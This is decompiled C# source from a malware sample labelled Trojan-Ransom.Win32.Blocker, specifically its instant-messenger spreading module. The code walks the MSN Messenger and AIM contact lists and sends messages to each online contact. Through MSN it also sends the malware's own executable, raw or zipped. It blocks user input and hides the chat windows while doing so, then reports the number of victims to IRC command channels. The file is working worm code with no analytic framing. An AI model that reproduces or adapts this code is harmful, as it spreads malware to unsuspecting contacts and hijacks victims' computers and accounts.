// Decompiled with JetBrains decompiler
// Type: rundll32.spreaders.im
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using MSNMessengerAPI;
using System;
using System.Collections.Specialized;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace rundll32.spreaders
{
  internal class im
  {
    internal class msn
    {
      private const int SW_HIDE = 0;
      private const int WM_KEYDOWN = 256;
      private const int WM_CHAR = 258;
      private static irc _irc;
      private static string _msg;
      private static string _filename;
      private static string _zipname;
      private static Thread t;

      [DllImport("user32.dll", CharSet = CharSet.Auto)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool BlockInput([MarshalAs(UnmanagedType.Bool), In] bool fBlockIt);

      [DllImport("user32.dll")]
      private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

      [DllImport("user32.dll", SetLastError = true)]
      private static extern IntPtr FindWindowEx(
        IntPtr parentHandle,
        IntPtr childAfter,
        string className,
        IntPtr windowTitle);

      [DllImport("user32.dll", SetLastError = true)]
      private static extern bool PostMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool SetForegroundWindow(IntPtr hWnd);

      public static void sendMsg(irc irc, string msg)
      {
        try
        {
          im.msn.t.Abort();
        }
        catch
        {
        }
        im.msn._irc = irc;
        im.msn._msg = msg;
        im.msn.t = new Thread(new ThreadStart(im.msn.sendMsgThread));
        im.msn.t.Start();
      }

      public static void sendFile(irc irc, string msg, string filename)
      {
        try
        {
          im.msn.t.Abort();
        }
        catch
        {
        }
        im.msn._irc = irc;
        im.msn._msg = msg;
        im.msn._filename = filename;
        im.msn.t = new Thread(new ThreadStart(im.msn.sendFileThread));
        im.msn.t.Start();
      }

      public static void sendZipFile(irc irc, string msg, string zipname, string filename)
      {
        try
        {
          im.msn.t.Abort();
        }
        catch
        {
        }
        im.msn._irc = irc;
        im.msn._msg = msg;
        im.msn._zipname = zipname;
        im.msn._filename = filename;
        im.msn.t = new Thread(new ThreadStart(im.msn.sendZipFileThread));
        im.msn.t.Start();
      }

      private static void sendMsgThread()
      {
        int num1 = 0;
        try
        {
          Messenger messenger = (Messenger) new MessengerClass();
          foreach (IMSNMessengerContact myContact in (IMSNMessengerContacts) ((IMSNMessenger3) messenger).MyContacts)
          {
            if (myContact.Status != 1)
            {
              im.msn.BlockInput(true);
              IMSNMessengerWindow imsnMessengerWindow = (IMSNMessengerWindow) ((IMSNMessenger3) messenger).InstantMessage((object) myContact);
              im.msn.ShowWindow((IntPtr) imsnMessengerWindow.HWND, 0);
              IntPtr windowEx = im.msn.FindWindowEx(im.msn.FindWindowEx((IntPtr) imsnMessengerWindow.HWND, IntPtr.Zero, "IM Window Class", IntPtr.Zero), IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
              foreach (int num2 in im.msn._msg)
              {
                uint uint32 = Convert.ToUInt32(num2.ToString().ToUpper());
                im.msn.PostMessage(windowEx, 258U, uint32, 2097153U);
              }
              im.msn.PostMessage(windowEx, 256U, 13U, 2097153U);
              ++num1;
              imsnMessengerWindow.Close();
              im.msn.BlockInput(false);
              Thread.Sleep(config.im_msn_interval);
            }
          }
        }
        catch
        {
          im.msn.BlockInput(false);
        }
        foreach (string[] onConnChannel in config.onConnChannels)
        {
          if (num1 != 0)
            im.msn._irc.sendMessage(onConnChannel[0], ".:MSN:. - \u000308Sent message to \u000309" + num1.ToString() + "\u000308 people!");
        }
      }

      private static void sendFileThread()
      {
        int num1 = 0;
        try
        {
          if (!im.msn._filename.Contains("."))
            im.msn._filename += ".exe";
          if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._filename))
            File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._filename);
          File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._filename);
          StringCollection filePaths = new StringCollection();
          filePaths.Add(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._filename);
          Messenger messenger = (Messenger) new MessengerClass();
          foreach (IMSNMessengerContact myContact in (IMSNMessengerContacts) ((IMSNMessenger3) messenger).MyContacts)
          {
            if (myContact.Status != 1)
            {
              im.msn.BlockInput(true);
              IMSNMessengerWindow imsnMessengerWindow = (IMSNMessengerWindow) ((IMSNMessenger3) messenger).InstantMessage((object) myContact);
              im.msn.ShowWindow((IntPtr) imsnMessengerWindow.HWND, 1);
              IntPtr windowEx = im.msn.FindWindowEx(im.msn.FindWindowEx((IntPtr) imsnMessengerWindow.HWND, IntPtr.Zero, "IM Window Class", IntPtr.Zero), IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
              im.msn.SetForegroundWindow((IntPtr) imsnMessengerWindow.HWND);
              Clipboard.SetFileDropList(filePaths);
              SendKeys.SendWait("^v");
              Thread.Sleep(200);
              SendKeys.SendWait("{TAB}");
              SendKeys.SendWait("{ENTER}");
              ++num1;
              foreach (int num2 in im.msn._msg)
              {
                uint uint32 = Convert.ToUInt32(num2.ToString().ToUpper());
                im.msn.PostMessage(windowEx, 258U, uint32, 0U);
              }
              im.msn.PostMessage(windowEx, 256U, 13U, 0U);
              im.msn.ShowWindow((IntPtr) imsnMessengerWindow.HWND, 0);
              im.msn.BlockInput(false);
            }
          }
        }
        catch
        {
          im.msn.BlockInput(false);
        }
        foreach (string[] onConnChannel in config.onConnChannels)
        {
          if (num1 != 0)
            im.msn._irc.sendMessage(onConnChannel[0], ".:MSN:. - \u000308Sent file to \u000309" + num1.ToString() + "\u000308 people!");
        }
      }

      private static void sendZipFileThread()
      {
        int num1 = 0;
        try
        {
          if (!im.msn._zipname.Contains("."))
            im.msn._zipname += ".zip";
          if (!im.msn._filename.Contains("."))
            im.msn._filename += ".exe";
          if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._zipname))
            File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._zipname);
          string executablePath = Application.ExecutablePath;
          ZipStorer zipStorer = ZipStorer.Create(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._zipname, "");
          zipStorer.AddFile(ZipStorer.Compression.Deflate, executablePath, im.msn._filename, "");
          zipStorer.Close();
          StringCollection filePaths = new StringCollection();
          filePaths.Add(Environment.GetEnvironmentVariable("TEMP") + "\\" + im.msn._zipname);
          IMSNMessenger3 imsnMessenger3 = (IMSNMessenger3) new MessengerClass();
          foreach (IMSNMessengerContact myContact in (IMSNMessengerContacts) imsnMessenger3.MyContacts)
          {
            if (myContact.Status != 1)
            {
              im.msn.BlockInput(true);
              IMSNMessengerWindow imsnMessengerWindow = (IMSNMessengerWindow) imsnMessenger3.InstantMessage((object) myContact);
              im.msn.ShowWindow((IntPtr) imsnMessengerWindow.HWND, 1);
              IntPtr windowEx = im.msn.FindWindowEx(im.msn.FindWindowEx((IntPtr) imsnMessengerWindow.HWND, IntPtr.Zero, "IM Window Class", IntPtr.Zero), IntPtr.Zero, "DirectUIHWND", IntPtr.Zero);
              im.msn.SetForegroundWindow((IntPtr) imsnMessengerWindow.HWND);
              Clipboard.SetFileDropList(filePaths);
              SendKeys.SendWait("^v");
              Thread.Sleep(200);
              SendKeys.SendWait("{TAB}");
              SendKeys.SendWait("{ENTER}");
              ++num1;
              foreach (int num2 in im.msn._msg)
              {
                uint uint32 = Convert.ToUInt32(num2.ToString().ToUpper());
                im.msn.PostMessage(windowEx, 258U, uint32, 0U);
              }
              im.msn.PostMessage(windowEx, 256U, 13U, 0U);
              im.msn.ShowWindow((IntPtr) imsnMessengerWindow.HWND, 0);
              im.msn.BlockInput(false);
            }
          }
        }
        catch
        {
          im.msn.BlockInput(false);
        }
        foreach (string[] onConnChannel in config.onConnChannels)
        {
          if (num1 != 0)
            im.msn._irc.sendMessage(onConnChannel[0], ".:MSN:. - \u000308Sent zipfile to \u000309" + num1.ToString() + "\u000308 people!");
        }
      }
    }

    internal class aim
    {
      private const int WM_CLOSE = 16;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private const int KEYEVENTF_EXTENDEDKEY = 1;
      private const int KEYEVENTF_KEYUP = 2;
      private const int VK_ESCAPE = 27;
      private const int VK_HOME = 36;
      private const int VK_LEFT = 37;
      private const int VK_UP = 38;
      private const int VK_RIGHT = 39;
      private const int VK_DOWN = 40;
      private const int VK_MENU = 18;
      private const int VK_RETURN = 13;
      private const int VK_CONTROL = 17;
      private const int VK_TAB = 9;
      private const int VK_LSHIFT = 160;
      private const int VK_END = 35;
      private static string _msg = "";
      private static irc _irc = (irc) null;
      private static Thread t = (Thread) null;

      [DllImport("user32.dll", CharSet = CharSet.Auto)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool BlockInput([MarshalAs(UnmanagedType.Bool), In] bool fBlockIt);

      [DllImport("user32.dll", SetLastError = true)]
      private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool IsWindow(IntPtr hWnd);

      [DllImport("user32.dll", CharSet = CharSet.Auto)]
      private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern int GetWindowTextLength(IntPtr hWnd);

      [DllImport("user32.dll", SetLastError = true)]
      private static extern IntPtr FindWindowEx(
        IntPtr hwndParent,
        IntPtr hwndChildAfter,
        string lpszClass,
        string lpszWindow);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool SetForegroundWindow(IntPtr hWnd);

      [DllImport("user32.dll")]
      private static extern void keybd_event(int bVk, int bScan, int dwFlags, int dwExtraInfo);

      [DllImport("user32.dll")]
      private static extern short VkKeyScan(char ch);

      private static string GetText(IntPtr hWnd)
      {
        StringBuilder lpString = new StringBuilder(im.aim.GetWindowTextLength(hWnd) + 1);
        im.aim.GetWindowText(hWnd, lpString, lpString.Capacity);
        return lpString.ToString();
      }

      public static void sendMsg(irc irc, string msg)
      {
        try
        {
          im.aim.t.Abort();
        }
        catch
        {
        }
        im.aim._irc = irc;
        im.aim._msg = msg;
        im.aim.t = new Thread(new ThreadStart(im.aim.sendMsgThread));
        im.aim.t.Start();
      }

      public static void sendMsgThread()
      {
        int num1 = 0;
        IntPtr window = im.aim.FindWindow("imAppSystemTrayHandler", "imApp");
        IntPtr num2 = IntPtr.Zero;
        IntPtr num3 = IntPtr.Zero;
        IntPtr zero = IntPtr.Zero;
        string str = (string) null;
        bool flag = false;
        if (im.aim.IsWindow(window))
        {
          im.aim.SendMessage(window, 101, 321, 515);
          int num4 = 0;
          do
          {
            ++num4;
            switch (num4)
            {
              case 1:
                num2 = im.aim.FindWindow("__oxFrame.class__", "AIM (Available)");
                break;
              case 2:
                num2 = im.aim.FindWindow("__oxFrame.class__", "AIM (Away)");
                break;
              case 3:
                num2 = im.aim.FindWindow("__oxFrame.class__", "AIM (Mobile)");
                break;
              case 4:
                num4 = 0;
                break;
            }
          }
          while (!im.aim.IsWindow(num2));
          do
          {
            num3 = im.aim.FindWindowEx(IntPtr.Zero, num3, "__oxFrame.class__", (string) null);
            if (im.aim.GetText(num3) != "AIM")
              im.aim.SendMessage(num3, 16, 0, 0);
          }
          while (im.aim.IsWindow(num3));
          im.aim.TritonSetupList(num2);
label_21:
          if (!flag)
          {
            im.aim.SetForegroundWindow(num2);
            Thread.Sleep(250);
            im.aim.SysKey(num2, 40, 1);
            im.aim.SysKey(num2, 13, 1);
            IntPtr num5 = IntPtr.Zero;
            do
            {
              num5 = im.aim.FindWindowEx(IntPtr.Zero, num5, "__oxFrame.class__", (string) null);
              if (im.aim.IsWindow(num5))
              {
                string text = im.aim.GetText(num5);
                if (text.StartsWith("IM"))
                {
                  if (text == str)
                  {
                    flag = true;
                  }
                  else
                  {
                    str = text;
                    im.aim.SetForegroundWindow(num5);
                    im.aim.TritonIm(num5, im.aim._msg);
                    ++num1;
                  }
                  im.aim.SendMessage(num5, 16, 0, 0);
                }
              }
            }
            while (im.aim.IsWindow(num5));
            goto label_21;
          }
          else
            im.aim.TritonSetupList(num2);
        }
        foreach (string[] onConnChannel in config.onConnChannels)
        {
          if (num1 != 0)
            im.aim._irc.sendMessage(onConnChannel[0], ".:AIM:. - \u000308Sent message to \u000309" + num1.ToString() + "\u000308 people!");
        }
      }

      private static void TritonIm(IntPtr hWindow, string msg)
      {
        IntPtr num = IntPtr.Zero;
        for (int index = 0; index < msg.Length; ++index)
        {
          if (msg[index] == '[')
          {
            im.aim.keybd_event(17, 0, 0, 0);
            short bVk = im.aim.VkKeyScan('l');
            im.aim.keybd_event((int) (ushort) bVk, 0, 0, 0);
            im.aim.keybd_event((int) (ushort) bVk, 0, 2, 0);
            im.aim.keybd_event(17, 0, 2, 0);
            while (!im.aim.IsWindow(num))
              num = im.aim.FindWindowEx(IntPtr.Zero, num, "__oxFrame.class__", "Edit Hyperlink");
            im.aim.SetForegroundWindow(num);
          }
          else if (msg[index] == '*')
            im.aim.HitKey(9, 1);
          else if (msg[index] == ']')
          {
            im.aim.HitKey(9, 1);
            im.aim.HitKey(13, 1);
            Thread.Sleep(250);
            im.aim.SetForegroundWindow(hWindow);
          }
          else
          {
            short bVk = im.aim.VkKeyScan(msg[index]);
            if (char.IsUpper(msg[index]))
              im.aim.keybd_event(160, 0, 0, 0);
            im.aim.keybd_event((int) bVk, 0, 0, 0);
            im.aim.keybd_event((int) bVk, 0, 2, 0);
            if (char.IsUpper(msg[index]))
              im.aim.keybd_event(160, 0, 2, 0);
          }
        }
        im.aim.SetForegroundWindow(hWindow);
        im.aim.HitKey(13, 1);
        Thread.Sleep(250);
      }

      private static bool TritonSetupList(IntPtr hBuddyList)
      {
        im.aim.SetForegroundWindow(hBuddyList);
        Thread.Sleep(250);
        im.aim.SysKey(hBuddyList, 27, 2);
        im.aim.SysKey(hBuddyList, 36, 1);
        im.aim.SysKey(hBuddyList, 39, 1);
        im.aim.SysKey(hBuddyList, 35, 1);
        im.aim.SysKey(hBuddyList, 39, 1);
        im.aim.SysKey(hBuddyList, 36, 1);
        return true;
      }

      private static void SysKey(IntPtr hWindow, int wKey, int iTimes)
      {
        for (int index = 0; index < iTimes; ++index)
        {
          im.aim.SendMessage(hWindow, 260, wKey, 0);
          im.aim.SendMessage(hWindow, 261, wKey, 0);
        }
      }

      private static void HitKey(int cKey, int iTimes)
      {
        for (int index = 0; index < iTimes; ++index)
        {
          im.aim.keybd_event(cKey, 0, 0, 0);
          im.aim.keybd_event(cKey, 0, 2, 0);
        }
      }
    }
  }
}
